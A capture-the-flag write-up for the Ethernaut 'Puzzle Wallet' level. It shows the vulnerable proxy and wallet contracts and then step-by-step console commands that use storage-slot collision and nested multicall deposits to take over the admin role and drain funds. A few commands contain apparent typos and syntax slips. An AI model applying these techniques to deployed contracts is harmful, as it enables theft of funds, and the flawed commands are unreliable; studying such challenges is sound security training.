# Puzzle Wallet 

## Given code:
```shell
Imports ...

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## Hack:
The main goal here will be to force payments into our balance to exceed the contract balance and then withdraw. 

Step1:

Create three vars (in browser terminal):
```
var functionSig = {
        name: 'proposeNewAdmin',
        type: 'function',
        inputs: [
            {
                type: 'address',
                name: '_newAdmin'
            }
        ]
    }
```

`params = [player]`

`data = web3.eth.abi.encodeFunctionCall(functionSig, params)`

Step2: 

Build/send tx

`await web3.eth.sendTransaction({from: player, to: instance, data})`

Step3:

Add ourselves to whitelist

`await contract.addToWhitelist(player)`

Step4:

Build a 'recursive' multicall tx. See notes below.

`depositData = await contract.methods["deposit()"].require().then(v => v.data)`

`multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)`

Step5:

Make 'recursive' multicall deposit

`await contract.multicall([multicallData, multicallData]), {value: toWei('0.001')})`

Step6:

Burn 2 wei

`await contract.execute(player, toWei('0.002'), 0x0)`

Step7:

Set `uint256 maxBalance` to equal `player` address - note that this storage slot corrosponds to the `admin` slot in the proxy.

`await contract.setMaxBalance(player)`

# Notes:

Recursive multicall:

I use this term loosely but see that there is a boolean guard within the multicall function to ensure only one deposit is being made. This is not unlike a reentrancy gaurd. By calling multicall, while calling multicall this bool gaurd will no longer protect the contract from this. 
